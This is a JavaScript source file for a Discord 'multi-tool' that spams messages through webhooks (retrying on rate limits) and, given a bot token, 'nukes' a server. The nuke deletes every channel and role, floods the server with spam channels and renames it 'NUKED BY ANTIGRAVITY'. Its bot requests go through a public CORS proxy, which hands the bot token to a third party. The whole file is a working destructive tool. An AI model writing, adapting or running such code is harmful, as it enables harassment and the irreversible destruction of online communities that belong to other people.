/* ============================================= */
/*  ANTIGRAVITY DISCORD MULTI-TOOL - APP ENGINE   */
/* ============================================= */

const DISCORD_API = 'https://discord.com/api/v10';
const CORS_PROXY = 'https://corsproxy.io/?';

// ===== STATE =====
const State = {
    spamRunning: false,
    spamAbort: false,
    botToken: null,
    selectedGuild: null,
    guilds: [],
    sentCount: 0,
    totalCount: 0
};

// ===== UTILITY =====
function $(id) { return document.getElementById(id); }
function qs(sel) { return document.querySelector(sel); }
function qsa(sel) { return document.querySelectorAll(sel); }

function timestamp() {
    const d = new Date();
    return d.toLocaleTimeString('en-US', { hour12: false });
}

function log(msg, type = 'info') {
    const container = $('logContainer');
    const entry = document.createElement('div');
    entry.className = `log-entry log-${type}`;
    entry.innerHTML = `<span class="log-time">${timestamp()}</span> <span class="log-msg">${msg}</span>`;
    container.appendChild(entry);
    container.scrollTop = container.scrollHeight;
}

function setStatus(text, type = '') {
    $('statusText').textContent = text;
    const dot = $('statusDot');
    dot.className = 'status-dot';
    if (type) dot.classList.add(type);
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ===== TAB NAVIGATION =====
qsa('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        qsa('.tab-btn').forEach(b => b.classList.remove('active'));
        qsa('.tab-panel').forEach(p => p.classList.remove('active'));
        btn.classList.add('active');
        $(`panel${btn.dataset.tab.charAt(0).toUpperCase() + btn.dataset.tab.slice(1)}`).classList.add('active');
    });
});

// ===== EMBED TOGGLE =====
$('embedToggle').addEventListener('change', function() {
    $('embedSection').classList.toggle('visible', this.checked);
});

// ===== COLOR PICKER =====
$('embedColor').addEventListener('input', function() {
    $('colorHex').textContent = this.value;
});

// ===== TOKEN VISIBILITY =====
$('btnToggleToken').addEventListener('click', () => {
    const input = $('botToken');
    input.type = input.type === 'password' ? 'text' : 'password';
});

// ===== CLEAR LOGS =====
$('btnClearLogs').addEventListener('click', () => {
    $('logContainer').innerHTML = '';
    log('Logs cleared.', 'info');
});

// ===== WEBHOOK FUNCTIONS =====

function buildPayload() {
    const content = $('webhookMessage').value;
    const name = $('webhookName').value || undefined;
    const avatar = $('webhookAvatar').value || undefined;
    const tts = $('webhookTTS').checked;

    const payload = {};
    if (content) payload.content = content;
    if (name) payload.username = name;
    if (avatar) payload.avatar_url = avatar;
    if (tts) payload.tts = true;

    if ($('embedToggle').checked) {
        const embed = {};
        const title = $('embedTitle').value;
        const desc = $('embedDesc').value;
        const color = $('embedColor').value;
        const footer = $('embedFooter').value;
        const image = $('embedImage').value;

        if (title) embed.title = title;
        if (desc) embed.description = desc;
        if (color) embed.color = parseInt(color.replace('#', ''), 16);
        if (footer) embed.footer = { text: footer };
        if (image) embed.image = { url: image };
        embed.timestamp = new Date().toISOString();

        payload.embeds = [embed];
    }

    return payload;
}

async function sendWebhook(url, payload) {
    const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });

    if (res.status === 429) {
        const data = await res.json();
        const retryAfter = data.retry_after * 1000 || 1000;
        log(`Rate limited. Waiting ${retryAfter}ms...`, 'warn');
        await sleep(retryAfter);
        return sendWebhook(url, payload);
    }

    return res;
}

// ===== TEST WEBHOOK =====
$('btnTestWebhook').addEventListener('click', async () => {
    const url = $('webhookUrl').value;
    if (!url) { log('No webhook URL provided.', 'error'); return; }

    log('Sending test message...', 'info');
    setStatus('Testing...', 'running');

    try {
        const payload = buildPayload();
        if (!payload.content && !payload.embeds) payload.content = '🧪 Antigravity Overdrive — Test Message';
        const res = await sendWebhook(url, payload);
        if (res.ok || res.status === 204) {
            log('Test message sent successfully!', 'success');
            setStatus('Test OK', 'active');
        } else {
            log(`Test failed: HTTP ${res.status}`, 'error');
            setStatus('Error', 'error');
        }
    } catch (e) {
        log(`Test error: ${e.message}`, 'error');
        setStatus('Error', 'error');
    }
});

// ===== DELETE WEBHOOK =====
$('btnDeleteWebhook').addEventListener('click', async () => {
    const url = $('webhookUrl').value;
    if (!url) { log('No webhook URL provided.', 'error'); return; }
    if (!confirm('Are you sure you want to DELETE this webhook?')) return;

    log('Deleting webhook...', 'warn');
    try {
        const res = await fetch(url, { method: 'DELETE' });
        if (res.ok || res.status === 204) {
            log('Webhook deleted successfully.', 'success');
        } else {
            log(`Delete failed: HTTP ${res.status}`, 'error');
        }
    } catch (e) {
        log(`Delete error: ${e.message}`, 'error');
    }
});

// ===== START SPAM =====
$('btnStartSpam').addEventListener('click', async () => {
    const url = $('webhookUrl').value;
    if (!url) { log('No webhook URL provided.', 'error'); return; }

    const count = parseInt($('webhookCount').value) || 10;
    const delay = parseInt($('webhookDelay').value) || 500;

    State.spamRunning = true;
    State.spamAbort = false;
    State.sentCount = 0;
    State.totalCount = count;

    $('btnStartSpam').disabled = true;
    $('btnStopSpam').disabled = false;
    $('progressTotal').textContent = count;
    $('progressSent').textContent = '0';
    $('progressFill').style.width = '0%';

    setStatus(`Spamming 0/${count}`, 'running');
    log(`Starting spam: ${count} messages, ${delay}ms delay`, 'info');

    const payload = buildPayload();
    if (!payload.content && !payload.embeds) payload.content = '⚡ Antigravity Overdrive';

    const startTime = Date.now();

    for (let i = 0; i < count; i++) {
        if (State.spamAbort) {
            log(`Spam aborted at ${i}/${count}`, 'warn');
            break;
        }

        try {
            await sendWebhook(url, payload);
            State.sentCount++;
            $('progressSent').textContent = State.sentCount;
            const pct = ((State.sentCount / count) * 100).toFixed(1);
            $('progressFill').style.width = `${pct}%`;

            const elapsed = (Date.now() - startTime) / 1000;
            const rate = (State.sentCount / elapsed).toFixed(1);
            $('progressRate').textContent = `${rate} msg/s`;
            setStatus(`Spamming ${State.sentCount}/${count}`, 'running');
        } catch (e) {
            log(`Send error at ${i}: ${e.message}`, 'error');
        }

        if (delay > 0 && i < count - 1) await sleep(delay);
    }

    State.spamRunning = false;
    $('btnStartSpam').disabled = false;
    $('btnStopSpam').disabled = true;

    if (!State.spamAbort) {
        log(`Spam complete: ${State.sentCount}/${count} messages sent.`, 'success');
        setStatus('Spam Complete', 'active');
    } else {
        setStatus('Aborted', 'error');
    }
});

// ===== STOP SPAM =====
$('btnStopSpam').addEventListener('click', () => {
    State.spamAbort = true;
    log('Abort signal sent...', 'warn');
    setStatus('Aborting...', 'error');
});

// ===== BOT API HELPER =====
async function botFetch(endpoint, options = {}) {
    const url = `${CORS_PROXY}${encodeURIComponent(DISCORD_API + endpoint)}`;
    const headers = {
        'Authorization': `Bot ${State.botToken}`,
        'Content-Type': 'application/json',
        ...options.headers
    };
    const res = await fetch(url, { ...options, headers });
    
    if (res.status === 429) {
        const data = await res.json();
        const retryAfter = (data.retry_after || 1) * 1000;
        log(`Bot rate limited. Waiting ${retryAfter}ms...`, 'warn');
        await sleep(retryAfter);
        return botFetch(endpoint, options);
    }
    
    return res;
}

// ===== CONNECT BOT =====
$('btnConnectBot').addEventListener('click', async () => {
    const token = $('botToken').value.trim();
    if (!token) { log('No bot token provided.', 'error'); return; }

    State.botToken = token;
    log('Authenticating bot...', 'info');
    setStatus('Connecting...', 'running');

    try {
        // Get bot user info
        const userRes = await botFetch('/users/@me');
        if (!userRes.ok) { log(`Auth failed: HTTP ${userRes.status}. Check your token.`, 'error'); setStatus('Auth Failed', 'error'); return; }
        const user = await userRes.json();

        const avatarUrl = user.avatar
            ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=64`
            : 'https://cdn.discordapp.com/embed/avatars/0.png';

        $('botAvatar').innerHTML = `<img src="${avatarUrl}" alt="Bot Avatar">`;
        $('botName').textContent = `${user.username}#${user.discriminator || '0'}`;
        $('botId').textContent = `ID: ${user.id}`;
        $('botInfo').style.display = 'flex';

        log(`Authenticated as ${user.username} (${user.id})`, 'success');

        // Get guilds
        const guildRes = await botFetch('/users/@me/guilds');
        if (!guildRes.ok) { log(`Failed to fetch guilds: HTTP ${guildRes.status}`, 'error'); return; }
        const guilds = await guildRes.json();
        State.guilds = guilds;

        const select = $('serverSelect');
        select.innerHTML = '<option value="">-- Select a server --</option>';
        guilds.forEach(g => {
            const opt = document.createElement('option');
            opt.value = g.id;
            opt.textContent = `${g.name} (${g.id})`;
            select.appendChild(opt);
        });
        select.disabled = false;

        log(`Loaded ${guilds.length} servers.`, 'success');
        setStatus('Bot Connected', 'active');
    } catch (e) {
        log(`Connection error: ${e.message}`, 'error');
        setStatus('Error', 'error');
    }
});

// ===== SERVER SELECT =====
$('serverSelect').addEventListener('change', async function() {
    const gid = this.value;
    if (!gid) { $('serverInfo').style.display = 'none'; State.selectedGuild = null; return; }

    State.selectedGuild = gid;
    log(`Selected server: ${gid}`, 'info');
    setStatus('Loading server...', 'running');

    try {
        const res = await botFetch(`/guilds/${gid}?with_counts=true`);
        if (!res.ok) { log(`Failed to load server info: HTTP ${res.status}`, 'error'); return; }
        const guild = await res.json();

        $('srvId').textContent = guild.id;
        $('srvMembers').textContent = guild.approximate_member_count || '?';

        // Get channels
        const chRes = await botFetch(`/guilds/${gid}/channels`);
        const channels = chRes.ok ? await chRes.json() : [];
        $('srvChannels').textContent = channels.length;

        // Get roles
        const rlRes = await botFetch(`/guilds/${gid}/roles`);
        const roles = rlRes.ok ? await rlRes.json() : [];
        $('srvRoles').textContent = roles.length;

        $('serverInfo').style.display = 'flex';
        setStatus('Server Loaded', 'active');
    } catch (e) {
        log(`Server info error: ${e.message}`, 'error');
        setStatus('Error', 'error');
    }
});

// ===== DELETE ALL CHANNELS =====
$('btnDeleteChannels').addEventListener('click', async () => {
    if (!State.selectedGuild) { log('No server selected.', 'error'); return; }
    if (!confirm('DELETE ALL CHANNELS in the selected server?')) return;

    log('Fetching channel list...', 'info');
    setStatus('Deleting channels...', 'running');

    try {
        const res = await botFetch(`/guilds/${State.selectedGuild}/channels`);
        const channels = await res.json();
        log(`Found ${channels.length} channels. Deleting...`, 'warn');

        let deleted = 0;
        for (const ch of channels) {
            try {
                await botFetch(`/channels/${ch.id}`, { method: 'DELETE' });
                deleted++;
                log(`Deleted #${ch.name} (${ch.id})`, 'success');
            } catch (e) {
                log(`Failed to delete #${ch.name}: ${e.message}`, 'error');
            }
            await sleep(300);
        }
        log(`Channel deletion complete: ${deleted}/${channels.length}`, 'success');
        setStatus('Channels Deleted', 'active');
    } catch (e) {
        log(`Channel delete error: ${e.message}`, 'error');
        setStatus('Error', 'error');
    }
});

// ===== CREATE CHANNELS =====
$('btnCreateChannels').addEventListener('click', async () => {
    if (!State.selectedGuild) { log('No server selected.', 'error'); return; }

    const name = $('newChannelName').value || 'LOL';
    const count = parseInt($('newChannelCount').value) || 50;

    log(`Creating ${count} channels named "${name}"...`, 'info');
    setStatus('Creating channels...', 'running');

    let created = 0;
    for (let i = 0; i < count; i++) {
        try {
            await botFetch(`/guilds/${State.selectedGuild}/channels`, {
                method: 'POST',
                body: JSON.stringify({ name: name, type: 0 })
            });
            created++;
            if (created % 10 === 0) log(`Created ${created}/${count} channels...`, 'info');
        } catch (e) {
            log(`Channel create error at ${i}: ${e.message}`, 'error');
        }
        await sleep(300);
    }
    log(`Channel creation complete: ${created}/${count}`, 'success');
    setStatus('Channels Created', 'active');
});

// ===== DELETE ALL ROLES =====
$('btnDeleteRoles').addEventListener('click', async () => {
    if (!State.selectedGuild) { log('No server selected.', 'error'); return; }
    if (!confirm('DELETE ALL ROLES in the selected server?')) return;

    log('Fetching role list...', 'info');
    setStatus('Deleting roles...', 'running');

    try {
        const res = await botFetch(`/guilds/${State.selectedGuild}/roles`);
        const roles = await res.json();
        const deletable = roles.filter(r => r.name !== '@everyone' && !r.managed);
        log(`Found ${deletable.length} deletable roles.`, 'warn');

        let deleted = 0;
        for (const role of deletable) {
            try {
                await botFetch(`/guilds/${State.selectedGuild}/roles/${role.id}`, { method: 'DELETE' });
                deleted++;
                log(`Deleted role: ${role.name}`, 'success');
            } catch (e) {
                log(`Failed to delete role ${role.name}: ${e.message}`, 'error');
            }
            await sleep(300);
        }
        log(`Role deletion complete: ${deleted}/${deletable.length}`, 'success');
        setStatus('Roles Deleted', 'active');
    } catch (e) {
        log(`Role delete error: ${e.message}`, 'error');
        setStatus('Error', 'error');
    }
});

// ===== RENAME SERVER =====
$('btnRenameServer').addEventListener('click', async () => {
    if (!State.selectedGuild) { log('No server selected.', 'error'); return; }
    const newName = $('nukeServerName').value || 'NUKED BY ANTIGRAVITY';

    log(`Renaming server to "${newName}"...`, 'info');
    setStatus('Renaming...', 'running');

    try {
        const res = await botFetch(`/guilds/${State.selectedGuild}`, {
            method: 'PATCH',
            body: JSON.stringify({ name: newName })
        });
        if (res.ok) {
            log(`Server renamed to "${newName}"`, 'success');
            setStatus('Renamed', 'active');
        } else {
            log(`Rename failed: HTTP ${res.status}`, 'error');
            setStatus('Error', 'error');
        }
    } catch (e) {
        log(`Rename error: ${e.message}`, 'error');
        setStatus('Error', 'error');
    }
});

// ===== FULL NUKE SEQUENCE =====
$('btnFullNuke').addEventListener('click', async () => {
    if (!State.selectedGuild) { log('No server selected.', 'error'); return; }
    if (!confirm('⚠️ FULL NUKE SEQUENCE: This will destroy the entire server. Are you SURE?')) return;
    if (!confirm('⚠️ FINAL WARNING: This action is IRREVERSIBLE. Proceed?')) return;

    const channelName = $('newChannelName').value || 'LOL';
    const channelCount = parseInt($('newChannelCount').value) || 50;
    const newServerName = $('nukeServerName').value || 'NUKED BY ANTIGRAVITY';

    log('☢️ FULL NUKE SEQUENCE INITIATED', 'error');
    setStatus('NUKING...', 'running');

    // Phase 1: Delete all channels
    log('— Phase 1: Deleting all channels...', 'warn');
    try {
        const chRes = await botFetch(`/guilds/${State.selectedGuild}/channels`);
        const channels = await chRes.json();
        for (const ch of channels) {
            try { await botFetch(`/channels/${ch.id}`, { method: 'DELETE' }); } catch(e) {}
            await sleep(200);
        }
        log(`Deleted ${channels.length} channels.`, 'success');
    } catch (e) { log(`Channel deletion error: ${e.message}`, 'error'); }

    // Phase 2: Delete all roles
    log('— Phase 2: Deleting all roles...', 'warn');
    try {
        const rlRes = await botFetch(`/guilds/${State.selectedGuild}/roles`);
        const roles = await rlRes.json();
        for (const r of roles.filter(r => r.name !== '@everyone' && !r.managed)) {
            try { await botFetch(`/guilds/${State.selectedGuild}/roles/${r.id}`, { method: 'DELETE' }); } catch(e) {}
            await sleep(200);
        }
        log('Roles purged.', 'success');
    } catch (e) { log(`Role deletion error: ${e.message}`, 'error'); }

    // Phase 3: Create spam channels
    log(`— Phase 3: Creating ${channelCount} channels named "${channelName}"...`, 'warn');
    for (let i = 0; i < channelCount; i++) {
        try { await botFetch(`/guilds/${State.selectedGuild}/channels`, { method: 'POST', body: JSON.stringify({ name: channelName, type: 0 }) }); } catch(e) {}
        await sleep(200);
    }
    log(`Created ${channelCount} spam channels.`, 'success');

    // Phase 4: Rename server
    log('— Phase 4: Renaming server...', 'warn');
    try { await botFetch(`/guilds/${State.selectedGuild}`, { method: 'PATCH', body: JSON.stringify({ name: newServerName }) }); } catch(e) {}
    log(`Server renamed to "${newServerName}".`, 'success');

    log('☢️ FULL NUKE SEQUENCE COMPLETE', 'error');
    setStatus('NUKE COMPLETE', 'active');
});

// ===== INIT =====
log('⚡ Antigravity Discord Multi-Tool initialized.', 'info');
log('Webhook Spammer and Server Nuke modules ready.', 'info');
setStatus('Idle', '');
